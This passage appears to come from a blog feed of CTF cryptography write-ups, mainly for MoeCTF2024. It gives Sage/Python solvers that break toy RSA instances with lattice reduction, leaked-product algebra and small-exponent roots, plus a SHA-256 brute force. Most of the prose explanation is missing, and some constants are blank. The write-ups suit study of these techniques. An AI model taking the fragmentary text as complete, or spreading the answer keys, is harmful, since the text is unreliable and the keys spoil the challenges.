long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(enc1, d, n))).decode()</span><br><span class="line"></span><br><span class="line">n = <span class="number">73566307488763122580179867626252642940955298748752818919017828624963832700766915409125057515624347299603944790342215380220728964393071261454143348878369192979087090394858108255421841966688982884778999786076287493231499536762158941790933738200959195185310223268630105090119593363464568858268074382723204344819</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">hints = [<span class="number">18167664006612887319059224902765270796893002676833140278828762753019422055112981842474960489363321381703961075777458001649580900014422118323835566872616431879801196022002065870575408411392402196289546586784096</span>, <span class="number">16949724497872153018185454805056817009306460834363366674503445555601166063612534131218872220623085757598803471712484993846679917940676468400619280027766392891909311628455506176580754986432394780968152799110962</span>, <span class="number">17047826385266266053284093678595321710571075374778544212380847321745757838236659172906205102740667602435787521984776486971187349204170431714654733175622835939702945991530565925393793706654282009524471957119991</span>, <span class="number">25276634064427324410040718861523090738559926416024529567298785602258493027431468948039474136925591721164931318119534505838854361600391921633689344957912535216611716210525197658061038020595741600369400188538567</span>]</span><br><span class="line">c = <span class="number">30332590230153809507216298771130058954523332140754441956121305005101434036857592445870499808003492282406658682811671092885592290410570348283122359319554197485624784590315564056341976355615543224373344781813890901916269854242660708815123152440620383035798542275833361820196294814385622613621016771854846491244</span></span><br><span class="line">V = hints</span><br><span class="line">k = <span class="number">2</span>^<span class="number">800</span></span><br><span class="line">M = Matrix.column([k * v <span class="keyword">for</span> v <span class="keyword">in</span> V]).augment(Matrix.identity(<span class="built_in">len</span>(V)))</span><br><span class="line">B = [b[<span class="number">1</span>:] <span class="keyword">for</span> b <span class="keyword">in</span> M.LLL()]</span><br><span class="line">M = (k * Matrix(B[:<span class="built_in">len</span>(V)-<span class="number">2</span>])).T.augment(Matrix.identity(<span class="built_in">len</span>(V)))</span><br><span class="line">B = [b[-<span class="built_in">len</span>(V):] <span class="keyword">for</span> b <span class="keyword">in</span> M.LLL() <span class="keyword">if</span> <span class="built_in">set</span>(b[:<span class="built_in">len</span>(V)-<span class="number">2</span>]) == &#123;<span class="number">0</span>&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s, t <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">4</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    T = s*B[<span class="number">0</span>] + t*B[<span class="number">1</span>]</span><br><span class="line">    a1, a2, a3 ,a4 = T</span><br><span class="line">    kq = gcd(a1 * hints[<span class="number">1</span>] - a2 * hints[<span class="number">0</span>], n)</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> &lt; kq &lt; n:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;find!!&#x27;</span>, kq, s, t)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">16</span>, <span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> kq % i == <span class="number">0</span>:</span><br><span class="line">        kq //= i</span><br><span class="line">q = <span class="built_in">int</span>(kq)</span><br><span class="line">p = <span class="built_in">int</span>(n // kq)</span><br><span class="line">d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))).decode()</span><br><span class="line"></span><br><span class="line">enc3 = <span class="number">17737974772490835017139672507261082238806983528533357501033270577311227414618940490226102450232473366793815933753927943027643033829459416623683596533955075569578787574561297243060958714055785089716571943663350360324047532058597960949979894090400134473940587235634842078030727691627400903239810993936770281755</span></span><br><span class="line">flag3 = long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(enc3,d,n))).decode()</span><br><span class="line"></span><br><span class="line">flag = flag1 + flag2 + flag3</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>flag3</code><code>RSA2</code><code>h1=a*p+q</code> <code>h2=p+b*q</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> fpylll</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_linear_mod</span>(<span class="params">equations, bounds, guesses=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Solve an arbitrary system of modular linear equations over different moduli.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    equations: A sequence of (lhs == rhs, M) pairs, where lhs and rhs are expressions and M is the modulus.</span></span><br><span class="line"><span class="string">    bounds: A dictionary of &#123;var: M&#125; entries, where var is a variable and M is the maximum of that variable (the bound).</span></span><br><span class="line"><span class="string">        All variables used in the equations must be bounded.</span></span><br><span class="line"><span class="string">    guesses: An *optional* dictionary containing an approximation (guess) for each variable.</span></span><br><span class="line"><span class="string">        For e.g. uniformly distributed numbers, just use the mean (expected value).</span></span><br><span class="line"><span class="string">        Variables for which a guess is not specified are assumed to lie uniformly in [0, bound),</span></span><br><span class="line"><span class="string">        i.e. they will have a guess of bound/2.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NOTE: Bounds are *soft*. This function may return solutions above the bounds. If this happens, and the result</span></span><br><span class="line"><span class="string">    is incorrect, make some bounds smaller and try again.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; k = var(&#x27;k&#x27;)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; # solve CRT</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; solve_linear_mod([(k == 2, 3), (k == 4, 5), (k == 3, 7)], &#123;k: 3*5*7&#125;)</span></span><br><span class="line"><span class="string">    &#123;k: 59&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; x,y = var(&#x27;x,y&#x27;)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; solve_linear_mod([(2*x + 3*y == 7, 11), (3*x + 5*y == 3, 13), (2*x + 5*y == 6, 143)], &#123;x: 143, y: 143&#125;)</span></span><br><span class="line"><span class="string">    &#123;x: 62, y: 5&#125;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># The general idea is to set up an integer matrix equation Ax=y by introducing extra variables for the quotients,</span></span><br><span class="line">    <span class="comment"># then use LLL to solve the equation. We introduce extra axes in the lattice to observe the actual solution x,</span></span><br><span class="line">    <span class="comment"># which works so long as the solutions are known to be bounded (which is of course the case for modular equations).</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">vars</span> = <span class="built_in">list</span>(bounds)</span><br><span class="line">    <span class="keyword">if</span> guesses <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        guesses = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    NR = <span class="built_in">len</span>(equations)</span><br><span class="line">    NV = <span class="built_in">len</span>(<span class="built_in">vars</span>)</span><br><span class="line">    B = fpylll.IntegerMatrix(NR+NV, NR+NV)</span><br><span class="line">    Y = [<span class="literal">None</span>] * (NR + NV)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># B format (columns are the basis for the lattice):</span></span><br><span class="line">    <span class="comment"># [ eqns:NRxNV mods:NRxNR</span></span><br><span class="line">    <span class="comment">#   vars:NVxNV 0 ]</span></span><br><span class="line">    <span class="comment"># eqns correspond to equation axes, fi(...) = yi mod mi</span></span><br><span class="line">    <span class="comment"># vars correspond to variable axes, which effectively &quot;observe&quot; elements of the solution vector (x in Ax=y)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Compute scale such that the variable axes can&#x27;t interfere with the equation axes</span></span><br><span class="line">    nS = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> var <span class="keyword">in</span> <span class="built_in">vars</span>:</span><br><span class="line">        nS = <span class="built_in">max</span>(nS, <span class="built_in">int</span>(bounds[var]).bit_length())</span><br><span class="line">    <span class="comment"># NR + NV is a fudge to make CVP return correct results despite the 2^(n/2) error bound</span></span><br><span class="line">    S = (<span class="number">1</span> &lt;&lt; (nS + (NR + NV + <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Compute per-variable scale such that the variable axes are scaled roughly equally</span></span><br><span class="line">    scales = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> vi, var <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">vars</span>):</span><br><span class="line">        scale = S &gt;&gt; (<span class="built_in">int</span>(bounds[var]).bit_length())</span><br><span class="line">        scales[var] = scale</span><br><span class="line">        <span class="comment"># Fill in vars block of B</span></span><br><span class="line">        B[NR + vi, vi] = scale</span><br><span class="line">        <span class="comment"># Fill in &quot;guess&quot; for variable axis - try reducing bounds if the result is wrong</span></span><br><span class="line">        Y[NR + vi] = guesses.get(var, <span class="built_in">int</span>(bounds[var]) &gt;&gt; <span class="number">1</span>) * scale</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extract coefficients from equations</span></span><br><span class="line">    <span class="keyword">for</span> ri, (rel, m) <span class="keyword">in</span> <span class="built_in">enumerate</span>(equations):</span><br><span class="line">        op = rel.operator()</span><br><span class="line">        <span class="keyword">if</span> op <span class="keyword">is</span> <span class="keyword">not</span> operator.eq:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">&#x27;relation %s: not an equality relation&#x27;</span> % rel)</span><br><span class="line"></span><br><span class="line">        expr = (rel - rel.rhs()).lhs().expand()</span><br><span class="line">        <span class="keyword">for</span> var <span class="keyword">in</span> expr.variables():</span><br><span class="line">            <span class="keyword">if</span> var <span class="keyword">not</span> <span class="keyword">in</span> bounds:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: variable %s is not bounded&#x27;</span> % (rel, var))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Fill in eqns block of B</span></span><br><span class="line">        coeffs = []</span><br><span class="line">        <span class="keyword">for</span> vi, var <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">vars</span>):</span><br><span class="line">            <span class="keyword">if</span> expr.degree(var) &gt;= <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: equation is not linear in %s&#x27;</span> % (rel, var))</span><br><span class="line">            coeff = expr.coefficient(var)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff.is_constant():</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: coefficient of %s is not constant (equation is not linear)&#x27;</span> % (rel, var))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff.is_integer():</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: coefficient of %s is not an integer&#x27;</span> % (rel, var))</span><br><span class="line"></span><br><span class="line">            B[ri, vi] = (<span class="built_in">int</span>(coeff) % m) * S</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Fill in mods block of B</span></span><br><span class="line">        B[ri, NV + ri] = m * S</span><br><span class="line"></span><br><span class="line">        const = expr.subs(&#123;var: <span class="number">0</span> <span class="keyword">for</span> var <span class="keyword">in</span> <span class="built_in">vars</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> const.is_constant():</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: failed to extract constant&#x27;</span> % rel)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> const.is_integer():</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;relation %s: constant is not integer&#x27;</span> % rel)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Fill in corresponding equation axes of target Y</span></span><br><span class="line">        Y[ri] = (<span class="built_in">int</span>(-const) % m) * S</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Note that CVP requires LLL to be run first, and that LLL/CVP use the rows as the basis</span></span><br><span class="line">    Bt = B.transpose()</span><br><span class="line">    lll = fpylll.LLL.reduction(Bt)</span><br><span class="line">    result = fpylll.CVP.closest_vector(Bt, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check result for sanity</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, result[:NR])) != <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, Y[:NR])):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;CVP returned an incorrect result: input %s, output %s (try increasing your bounds?)&quot;</span> % (Y, result))</span><br><span class="line"></span><br><span class="line">    res = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> vi, var <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">vars</span>):</span><br><span class="line">        aa = result[NR + vi] // scales[var]</span><br><span class="line">        bb = result[NR + vi] % scales[var]</span><br><span class="line">        <span class="keyword">if</span> bb:</span><br><span class="line">            warnings.warn(<span class="string">&quot;CVP returned suspicious result: %s=%d is not scaled correctly (try adjusting your bounds?)&quot;</span> % (var, result[NR + vi]))</span><br><span class="line">        res[var] = aa</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c = </span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    h1 = </span><br><span class="line">    h2 = </span><br><span class="line">    var(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">    bounds = &#123;p: <span class="number">2</span>**<span class="number">512</span>, q: <span class="number">2</span>**<span class="number">512</span>&#125;</span><br><span class="line">    eqs = [(q*h1 + p*h2 - h1*h2==<span class="number">0</span>, n)]</span><br><span class="line">    sol = solve_linear_mod(eqs, bounds)</span><br><span class="line">    p = sol[p]</span><br><span class="line">    q = sol[q]</span><br><span class="line">    d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))).decode())</span><br></pre></td></tr></table></figure><p><br /><code>web</code>QWQ</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;code&gt;CTF&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&quot;2024&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#2024&quot;&gt;&lt;/a&gt; 2024&lt;/h1&gt;
&lt;h2 id=&quot;crypto0</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>MoeCTF2024 WriteUp</title>
    <link href="https://hvang10.github.io/2024/10/31/MoeCTF2024-WriteUp/"/>
    <id>https://hvang10.github.io/2024/10/31/MoeCTF2024-WriteUp/</id>
    <published>2024-10-31T12:55:11.000Z</published>
    <updated>2024-11-10T15:41:36.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><p><code>CRYPTO</code><code>wp</code><br /><a href="https://blog.csdn.net/weixin_52640415/article/details/141436804">https://blog.csdn.net/weixin_52640415/article/details/141436804</a></p><p><a href="https://www.cnblogs.com/naby/p/18466255">https://www.cnblogs.com/naby/p/18466255</a><br /></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br><span class="line">Signin</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">pq = (p-<span class="number">1</span>)*(q-<span class="number">2</span>)</span><br><span class="line">qp = (q-<span class="number">1</span>)*(p-<span class="number">2</span>)</span><br><span class="line">p_q = p + q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pq = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;qp = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p_q = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746</span></span><br><span class="line"><span class="string">pq = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462</span></span><br><span class="line"><span class="string">qp = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860</span></span><br><span class="line"><span class="string">n = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903</span></span><br><span class="line"><span class="string">p_q = 279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>RSA</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">phi = (pq+qp+p_q-<span class="number">2</span>)//<span class="number">2</span></span><br><span class="line"><span class="comment"># phi = (pq*qp)//(n-2*p_q+4)</span></span><br></pre></td></tr></table></figure><h2 id="ez_hash"><a class="markdownIt-Anchor" href="#ez_hash"></a> ez_hash</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, secrets</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;moectf&#123;&#x27;</span> + secrets + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> secrets[:<span class="number">4</span>] == <span class="string">b&#x27;2100&#x27;</span> <span class="keyword">and</span> <span class="built_in">len</span>(secrets) == <span class="number">10</span></span><br><span class="line">hash_value = sha256(secrets).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;hash_value = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># hash_value = &#x27;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&#x27;</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">dir</span> = <span class="string">&#x27;1234567890&#x27;</span></span><br><span class="line">dir_list = itertools.product(<span class="built_in">dir</span>, repeat=<span class="number">6</span>)</span><br><span class="line">hash_value = <span class="string">&#x27;3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a&#x27;</span></span><br><span class="line">head = <span class="string">&quot;2100&quot;</span></span><br><span class="line">xxxxxx = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dir_list:</span><br><span class="line">    data = i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]+i[<span class="number">4</span>]+i[<span class="number">5</span>]</span><br><span class="line">    data_sha = hashlib.sha256(</span><br><span class="line">        (head+data).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> data_sha == hash_value:</span><br><span class="line">        xxxxxx = data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;moectf&#123;2100&#x27;</span>+xxxxxx+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="big-and-small"><a class="markdownIt-Anchor" href="#big-and-small"></a> Big and small</h2><p>e</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(c, e)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><h2 id="baby_equation"><a class="markdownIt-Anchor" href="#baby_equation"></a> baby_equation</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">l = <span class="built_in">len</span>(flag)</span><br><span class="line">m1, m2 = flag[:l//<span class="number">2</span>], flag[l//<span class="number">2</span>:]</span><br><span class="line">a = bytes_to_long(m1)</span><br><span class="line">b = bytes_to_long(m2)</span><br><span class="line">k = <span class="number">0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40</span></span><br><span class="line"><span class="keyword">assert</span> ((a**<span class="number">2</span> + <span class="number">1</span>)*(b**<span class="number">2</span> + <span class="number">1</span>) - <span class="number">2</span>*(a - b)*(a*b - <span class="number">1</span>)) == <span class="number">4</span>*(k + a*b)</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mi>G</mi><mi>P</mi><mi>T</mi><mtext></mtext><mn>4</mn><mi>k</mi><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>b</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">GPT4k=((a+1)(b-1))^{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord">4</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo></mo><mo stretchy="false">(</mo><mi>b</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo><mtext></mtext><msup><mn>2</mn><mn>18</mn></msup><mo>=</mo><mn>262144</mn><mtext></mtext></mrow><annotation encoding="application/x-tex">(a+1)*(b-1)2^{18}=262144</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mord">2</span><span class="mord">1</span><span class="mord">4</span><span class="mord">4</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line">k = <span 